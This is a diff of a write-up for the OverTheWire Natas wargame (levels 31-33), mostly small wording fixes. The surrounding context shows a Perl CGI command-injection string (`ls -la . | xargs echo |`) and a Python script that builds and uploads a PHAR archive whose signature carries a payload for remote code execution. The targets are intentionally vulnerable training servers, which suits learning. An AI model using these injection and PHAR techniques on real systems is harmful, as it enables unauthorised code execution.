@@ -3442,7 +3442,8 @@ print(content)
 
 <img src="img/Pasted image 20240522195503.png" alt="Example Image" width="1080"/>
 
-We can upload , what are we want to ? ..... [http://natas31.natas.labs.overthewire.org/index-source.html](http://natas31.natas.labs.overthewire.org/index-source.html)
+We can upload , what are we want to ? ..... 
+Source View : [http://natas31.natas.labs.overthewire.org/index-source.html](http://natas31.natas.labs.overthewire.org/index-source.html)
 
 ```pl
 my $cgi = CGI->new;
@@ -3540,7 +3541,7 @@ But Got Nothing , let see pwd `/index.pl?ls -la . | xargs echo |` , `.` refers c
 </td></tr><tr><td>drwxr-x---  2 natas32 natas32  4096 May 22 14:48 tmp
 ```
 
-It looks like have a root access and name `getpassword`
+It looks like have a root access and name `getpassword` , again do same stuffs from above script 
 
 ```py
 import requests
@@ -3649,7 +3650,7 @@ Here its checking MD5 Checksum that is signature , if its match use `passthru()`
 
 Let Use Compresses , Like PHAR (PHP Archive)
 
-Template IMP save this as `natas33.php.template`
+This Template !Important save this as `natas33.php.template`
 
 ```php
 <?php
@@ -3673,7 +3674,7 @@ $phar->stopBuffering();
 ?>
 ```
 
-From This We Create Php like this using python , ( Don't Create Below file ) It Just for Understanding , signature Holds payload
+From This We Create Php like this using python , ( Don't Create Below file ) It Just for Understanding and see that signature Holds payload
 
 ```php
 <?php
@@ -3697,9 +3698,9 @@ $phar->stopBuffering();
 ?>
 ```
 
-We to create as PHAR file let write in python , imp we need `natas33.php.template`
+We to create as PHAR file let write in python, important we need `natas33.php.template`
 
-```php
+```py
 import requests
 import re
 import subprocess
@@ -3715,7 +3716,7 @@ hash_value = hashlib.md5(payload).hexdigest()
 filename = "rce.php"
 
 with open("natas33.php.template" , "r") as template:
-	with open("natas33.php" , "w") as file: # create natas33.php
+	with open("natas33.php" , "w") as file: # creating natas33.php
 		file.write(template.read().format(filename,payload.decode('ascii')))
 
 # creating phar file from natas33.php
@@ -3728,10 +3729,9 @@ requests.post(url + "/index.php",
 		auth=(username,passsowrd))
 
 response = requests.post(url + '/index.php' ,
-						 data={'filename': 'phar://natas33.phar/test.txt', 'submit': 'Upload File'},
-						 files={'uploadedfile': open('natas33.phar', 'rb')},
-						 auth=(username,passsowrd))
-
+		data={'filename': 'phar://natas33.phar/test.txt', 'submit': 'Upload File'},
+		files={'uploadedfile': open('natas33.phar', 'rb')},
+		auth=(username,passsowrd))
 print(response.text)
 ```
 
